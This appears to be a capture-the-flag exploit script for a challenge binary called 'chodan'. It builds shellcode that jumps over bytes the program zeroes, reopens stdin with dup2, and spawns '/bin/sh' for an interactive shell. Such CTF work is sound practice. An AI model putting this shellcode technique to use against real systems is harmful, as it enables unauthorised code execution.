#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./chodan', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''

b*main+214
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input("Please press ENTER")

# ==================== EXPLOIT ====================

# Every next 8 bytes are zero'ed out
# -> write shellcode that after it executes some instruction it skips to the next 8 byte
# the program closes stdin -> reopen it using dup2 syscall as stdout/stderr isn't closed
# dup2(2, 0) -> this now points stdin to stderr (dup2 will duplicate old_fd to new_fd)


def set_reg(reg, val):
    pad = asm("nop") * 8
    jmp_pad = asm("nop") * 3
    jmp_8 = b"\xeb\x08"

    sc = asm(f"xor {reg}, {reg}")
    sc += jmp_pad
    sc += jmp_8
    sc += pad
    sc += asm(f"push {val}")
    sc += asm(f"pop {reg}")
    sc += jmp_pad
    sc += jmp_8
    sc += pad

    return sc


def null_rsi_rdx():
    pad = asm("nop") * 8
    jmp_8 = b"\xeb\x08"

    sc = asm("xor rsi, rsi")
    sc += asm("xor rdx, rdx")
    sc += jmp_8
    sc += pad

    return sc


def set_rdi_ptr():
    pad = asm("nop") * 8
    jmp_8 = b"\xeb\x08"

    sc = asm("lea r8, [rsp + 0x10]")
    sc += asm("nop")
    sc += jmp_8
    sc += pad
    sc += asm("mov rdi, qword ptr [r8]")
    sc += asm("nop") * 3
    sc += jmp_8
    sc += pad

    return sc


def syscall():
    pad = asm("nop") * 8
    jmp_ad = asm("nop") * 4
    jmp_8 = b"\xeb\x08"

    sc = asm("syscall")
    sc += jmp_ad
    sc += jmp_8
    sc += pad

    return sc


def dup2():
    
    sc = set_reg('rax', 0x21)
    sc += set_reg('rdi', 0x2)
    sc += set_reg('rsi', 0x0)
    sc += syscall()
    return sc

def execve():

    sc = set_reg('rax', 0x3b)
    sc += null_rsi_rdx()
    sc += set_rdi_ptr()
    sc += syscall()
    return sc


# def add_rdi():
#     pad = asm("nop") * 8
#     jmp_ad = asm("nop") * 2
#     jmp_8 = b"\xeb\x08"

#     sc = asm("add rdi, 0x28")
#     sc += jmp_ad
#     sc += jmp_8
#     sc += pad

#     return sc


def exploit():
  
  shellcode = dup2()
  shellcode += execve()
  shellcode += cyclic(40) + b"/bin/sh\0"

  print(f"Length: {len(shellcode)}")
  print(disasm(shellcode))
    
   
  print("\nShellcode bytes (hex):")
  print(shellcode.hex())
    
   
  print("\nShellcode bytes (escaped):")
  print(''.join(f'\\x{b:02x}' for b in shellcode))
  

  sa(b":", shellcode)

  interactive()

if __name__ == '__main__':
  exploit()